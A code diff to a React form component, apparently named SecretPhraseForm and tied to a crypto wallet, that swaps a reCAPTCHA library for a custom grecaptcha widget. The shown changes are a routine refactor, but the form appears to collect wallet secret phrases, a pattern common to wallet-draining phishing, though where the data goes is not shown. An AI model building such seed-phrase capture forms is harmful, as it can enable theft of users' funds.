@@ -5,7 +5,6 @@ import Image from "next/image";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { z } from "zod";
-import ReCAPTCHA from "react-google-recaptcha";
 import { ArrowLeft, Copy } from "lucide-react";
 
 import {
@@ -79,9 +78,34 @@ const FormSchema = z.object({
   recaptcha: z.string().min(1, { message: "Please verify you are not a robot." })
 });
 
+// A simple component to render reCAPTCHA and handle its state
+const ReCAPTCHAComponent = ({ onChange }: { onChange: (token: string | null) => void }) => {
+  const recaptchaRef = React.useRef<HTMLDivElement>(null);
+
+  React.useEffect(() => {
+    if (!recaptchaRef.current) return;
+    
+    // Explicitly declare grecaptcha on window
+    const global = window as any;
+
+    const widgetId = global.grecaptcha.render(recaptchaRef.current, {
+      sitekey: "6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP", // Public test key
+      theme: "dark",
+      callback: onChange,
+      'expired-callback': () => onChange(null), // Handle expired token
+    });
+
+    return () => {
+      // Cleanup if needed, though usually not necessary for this basic implementation
+    };
+  }, [onChange]);
+
+  return <div ref={recaptchaRef}></div>;
+};
+
+
 function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   const { toast } = useToast();
-  const recaptchaRef = React.useRef<ReCAPTCHA>(null);
   const form = useForm<z.infer<typeof FormSchema>>({
     resolver: zodResolver(FormSchema),
     defaultValues: {
@@ -141,8 +165,9 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
         variant: "destructive",
       });
     } finally {
-        recaptchaRef.current?.reset();
-        form.reset();
+      // In a real app, you would reset grecaptcha here, but since the modal closes,
+      // it will be re-rendered on next open.
+      form.reset();
     }
   };
 
@@ -211,11 +236,8 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
             render={({ field }) => (
               <FormItem>
                 <FormControl>
-                  <ReCAPTCHA
-                    ref={recaptchaRef}
-                    sitekey="6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP" // This is a public test key
-                    onChange={(token) => field.onChange(token || "")}
-                    theme="dark"
+                  <ReCAPTCHAComponent
+                     onChange={(token) => field.onChange(token || "")}
                   />
                 </FormControl>
                 <FormMessage />
